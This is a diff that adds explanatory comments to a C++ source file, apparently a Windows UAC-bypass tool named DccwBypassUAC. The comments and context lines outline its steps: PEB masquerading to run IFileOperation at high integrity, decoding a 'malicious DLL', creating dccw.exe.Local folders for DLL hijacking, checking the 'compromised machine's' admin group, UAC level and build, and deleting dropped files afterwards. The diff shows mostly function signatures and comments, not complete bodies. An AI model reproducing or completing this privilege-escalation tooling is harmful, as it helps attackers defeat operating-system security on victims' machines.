@@ -1,5 +1,4 @@
-// DccwBypassUAC.cpp : Defines the entry point for the console application.
-//
+// DccwBypassUAC.cpp - Author: L3cr0f
 
 #include "stdafx.h"
 #include <stdio.h>
@@ -22,6 +21,7 @@ const int MINIMUM_BUILD_VERSION = 7600;
 const DWORD ALWAYS_NOTIFY_UAC_LEVEL = 2;
 const DWORD DEFAULT_UAC_LEVEL = 5;
 
+// Funtion that performs the Masquerade PEB so as to invoke IFileOperation at high integrity
 BOOL MasqueradePEB() {
 
 	typedef struct _UNICODE_STRING {
@@ -255,6 +255,7 @@ BOOL MasqueradePEB() {
 	return TRUE;
 }
 
+// Function that base64 decodes and decompresses our malicious DLL
 BOOL base64DecodeAndDecompressDLL(CHAR *buffer, LPCWSTR lpDecFile) {
 	DECOMPRESSOR_HANDLE decompressor = NULL;
 	PBYTE compressedBuffer = NULL;
@@ -338,6 +339,7 @@ BOOL base64DecodeAndDecompressDLL(CHAR *buffer, LPCWSTR lpDecFile) {
 	return TRUE;
 }
 
+// Function to get the names of the directories to perform the DLL hijacking
 std::vector <std::wstring> getDirectories(LPCWSTR targetedDirectories) {
 	WIN32_FIND_DATA ffd;
 	std::vector <std::wstring> dirNames;
@@ -373,6 +375,7 @@ std::vector <std::wstring> getDirectories(LPCWSTR targetedDirectories) {
 	return dirNames;
 }
 
+// Function to create the directories that will allow the DLL hijacking
 BOOL createDirectories(LPCTSTR targetedDirectories) {
 	BOOL success = TRUE;
 	LPCTSTR fixedDirectory = L"dccw.exe.Local";
@@ -392,6 +395,7 @@ BOOL createDirectories(LPCTSTR targetedDirectories) {
 	return success;
 }
 
+// Funtion that checks if the compromised user belongs to the Administator's group
 BOOL checkAdministratorGroup() {
 	DWORD i, dwSize = 0, dwResult = 0;
 	HANDLE hToken;
@@ -470,6 +474,7 @@ BOOL checkAdministratorGroup() {
 	return belongsToAdministratorsGroup;
 }
 
+// Funtion that retrieves us the build number of the compromised machine
 std::wstring getBuildNumber() {
 	HKEY root = HKEY_LOCAL_MACHINE;
 	std::wstring key = L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion";
@@ -511,6 +516,7 @@ std::wstring getBuildNumber() {
 	return value;
 }
 
+// Funtion that retrieves us the UAC level of the compromised machine
 DWORD getUACLevel() {
 	HKEY root = HKEY_LOCAL_MACHINE;
 	std::wstring key = L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System";
@@ -536,6 +542,7 @@ DWORD getUACLevel() {
 	return value;
 }
 
+// Funtion to copy the folders containing our malicious DLL to the specific location to perform the DLL hijacking
 BOOL IFileOperationCopy(LPCWSTR destPath, std::wstring buildVersion) {
 	IFileOperation *fileOperation = NULL;
 	WCHAR dllPath[1024];
@@ -610,6 +617,7 @@ BOOL IFileOperationCopy(LPCWSTR destPath, std::wstring buildVersion) {
 	return TRUE;
 }
 
+// Funtion to delete the elements dropped to the path to perform the DLL hijacking
 BOOL IFileOperationDelete(LPCWSTR destPath, std::wstring buildVersion) {
 	IFileOperation *fileOperation = NULL;
 
@@ -663,7 +671,7 @@ BOOL IFileOperationDelete(LPCWSTR destPath, std::wstring buildVersion) {
 
 	return TRUE;
 }
-
+// Funtion to delete all the elements dropped to the compromised machine
 BOOL removeFilesAndDirectories(LPCWSTR targetedDirectories) {
 	BOOL success = TRUE;
 
